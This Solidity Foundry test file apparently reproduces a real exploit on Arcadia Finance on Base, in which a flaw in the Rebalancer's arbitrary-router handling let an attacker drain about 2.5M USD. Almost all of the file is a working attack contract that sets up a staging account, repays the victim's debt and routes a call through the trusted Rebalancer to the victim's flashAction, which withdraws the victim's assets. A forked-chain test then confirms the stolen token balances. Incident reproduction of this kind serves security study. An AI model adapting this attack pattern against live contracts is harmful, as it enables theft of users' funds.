// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost: ~2.5M USD
// Attacker: https://basescan.org/address/0x0fa54e967a9cc5df2af38babc376c91a29878615
// Attack Tx: https://basescan.org/tx/0x06ce76eae6c12073df4aaf0b4231f951e4153a67f3abc1c1a547eb57d1218150
// Vulnerable Contract: https://basescan.org/address/0xc729213b9b72694f202feb9cf40fe8ba5f5a4509
//
// Arcadia users trusted the Rebalancer as an asset manager. The Rebalancer
// accepted an arbitrary router and called it directly. By supplying a victim
// Account as the router, an attacker made the trusted Rebalancer call the
// victim's flashAction() and withdraw every asset to the attacker.

struct ActionData {
    address[] assets;
    uint256[] assetIds;
    uint256[] assetAmounts;
    uint256[] assetTypes;
}

struct TokenPermissions {
    address token;
    uint256 amount;
}

struct PermitBatchTransferFrom {
    TokenPermissions[] permitted;
    uint256 nonce;
    uint256 deadline;
}

interface IArcadiaFactory {
    function createAccount(
        uint32 userSalt,
        uint256 accountVersion,
        address creditor
    ) external returns (address account);
}

interface IArcadiaAccount {
    function setAssetManager(
        address assetManager,
        bool value
    ) external;
    function deposit(
        address[] calldata assets,
        uint256[] calldata ids,
        uint256[] calldata amounts
    ) external;
    function flashAction(
        address actionTarget,
        bytes calldata actionData
    ) external;
    function generateAssetData()
        external
        view
        returns (address[] memory assets, uint256[] memory assetIds, uint256[] memory assetAmounts);
}

interface IArcadiaRebalancer {
    function setAccountInfo(
        address account,
        address initiator,
        address hook
    ) external;
    function setInitiatorInfo(
        uint256 tolerance,
        uint256 fee,
        uint256 minLiquidityRatio
    ) external;
    function rebalance(
        address account,
        address positionManager,
        uint256 oldId,
        int24 tickLower,
        int24 tickUpper,
        bytes calldata swapData
    ) external;
}

interface IArcadiaLendingPool {
    function maxWithdraw(
        address account
    ) external view returns (uint256);
    function repay(
        uint256 amount,
        address account
    ) external;
}

interface IPositionManager {
    struct MintParams {
        address token0;
        address token1;
        int24 tickSpacing;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
        uint160 sqrtPriceX96;
    }

    function mint(
        MintParams calldata params
    ) external returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
    function setApprovalForAll(
        address operator,
        bool approved
    ) external;
}

contract ArcadiaV2Attacker {
    IERC20 private constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 private constant CBBTC = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);

    IArcadiaFactory private constant FACTORY = IArcadiaFactory(0xDa14Fdd72345c4d2511357214c5B89A919768e59);
    IArcadiaRebalancer private constant REBALANCER = IArcadiaRebalancer(0xC729213B9b72694F202FeB9cf40FE8ba5F5A4509);
    IPositionManager private constant POSITION_MANAGER = IPositionManager(0x827922686190790b37229fd06084350E74485b72);
    IArcadiaLendingPool private constant CBBTC_LENDING_POOL =
        IArcadiaLendingPool(0xa37E9b4369dc20940009030BfbC2088F09645e3B);
    IArcadiaAccount private constant VICTIM = IArcadiaAccount(0x9529E5988ceD568898566782e88012cf11C3Ec99);
    address private constant STRATEGY_HOOK = 0xCD01715b785B18863D549973133C5bfEfd91995D;

    function attack() external {
        IArcadiaAccount staging = IArcadiaAccount(FACTORY.createAccount(1, 1, address(0)));
        staging.setAssetManager(address(REBALANCER), true);
        REBALANCER.setAccountInfo(address(staging), address(this), STRATEGY_HOOK);
        REBALANCER.setInitiatorInfo(9_999_999_999_999_999, 0, 0.98e18);

        USDC.approve(address(POSITION_MANAGER), type(uint256).max);
        CBBTC.approve(address(POSITION_MANAGER), type(uint256).max);
        (uint256 tokenId,,,) = POSITION_MANAGER.mint(
            IPositionManager.MintParams({
                token0: address(USDC),
                token1: address(CBBTC),
                tickSpacing: 100,
                tickLower: -71_100,
                tickUpper: -70_100,
                amount0Desired: 1_773_463_824,
                amount1Desired: 2_832_455,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp,
                sqrtPriceX96: 0
            })
        );

        USDC.approve(address(staging), type(uint256).max);
        CBBTC.approve(address(staging), type(uint256).max);
        POSITION_MANAGER.setApprovalForAll(address(staging), true);

        address[] memory assets = new address[](3);
        assets[0] = address(POSITION_MANAGER);
        assets[1] = address(USDC);
        assets[2] = address(CBBTC);
        uint256[] memory ids = new uint256[](3);
        ids[0] = tokenId;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1;
        amounts[1] = 10e6;
        amounts[2] = 1e8;
        staging.deposit(assets, ids, amounts);

        uint256 debt = CBBTC_LENDING_POOL.maxWithdraw(address(VICTIM));
        CBBTC.approve(address(CBBTC_LENDING_POOL), type(uint256).max);
        CBBTC_LENDING_POOL.repay(debt, address(VICTIM));

        bytes memory victimAction = _victimActionData();
        bytes memory routerCall = abi.encodeCall(VICTIM.flashAction, (address(this), victimAction));
        bytes memory swapData = abi.encode(address(VICTIM), uint256(1), routerCall);
        REBALANCER.rebalance(address(staging), address(POSITION_MANAGER), tokenId, -81_100, -80_100, swapData);
    }

    function executeAction(
        bytes calldata
    ) external returns (ActionData memory depositData) {
        CBBTC.transfer(address(REBALANCER), 1e8);
        USDC.transfer(address(REBALANCER), 50_000e6);
        depositData.assets = new address[](0);
        depositData.assetIds = new uint256[](0);
        depositData.assetAmounts = new uint256[](0);
        depositData.assetTypes = new uint256[](0);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function _victimActionData() private view returns (bytes memory) {
        ActionData memory empty;
        empty.assets = new address[](0);
        empty.assetIds = new uint256[](0);
        empty.assetAmounts = new uint256[](0);
        empty.assetTypes = new uint256[](0);

        PermitBatchTransferFrom memory permit;
        permit.permitted = new TokenPermissions[](0);

        (address[] memory assets, uint256[] memory ids, uint256[] memory amounts) = VICTIM.generateAssetData();
        uint256[] memory types = new uint256[](assets.length);
        ActionData memory withdrawData =
            ActionData({assets: assets, assetIds: ids, assetAmounts: amounts, assetTypes: types});
        return abi.encode(withdrawData, empty, permit, bytes(""), abi.encode(address(REBALANCER)));
    }
}

contract ArcadiaV2ExploitTest is Test {
    IERC20 private constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 private constant CBBTC = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
    IERC20 private constant TOKEN_820C = IERC20(0x820C137fa70C8691f0e44Dc420a5e53c168921Dc);
    IERC20 private constant AERO = IERC20(0x940181a94A35A4569E4529A3CDfB74e38FD98631);
    uint256 private constant FORK_BLOCK = 32_881_498;

    function setUp() public {
        vm.createSelectFork("https://base-mainnet.public.blastapi.io", FORK_BLOCK);
    }

    function testExploit() public {
        ArcadiaV2Attacker attacker = new ArcadiaV2Attacker();
        deal(address(USDC), address(attacker), 100_000e6);
        deal(address(CBBTC), address(attacker), 30e8);

        attacker.attack();

        emit log_named_decimal_uint("stolen TOKEN_820C", TOKEN_820C.balanceOf(address(attacker)), 18);
        emit log_named_decimal_uint("stolen AERO", AERO.balanceOf(address(attacker)), 18);
        assertGt(TOKEN_820C.balanceOf(address(attacker)), 800e18);
        assertGt(AERO.balanceOf(address(attacker)), 900e18);
    }
}
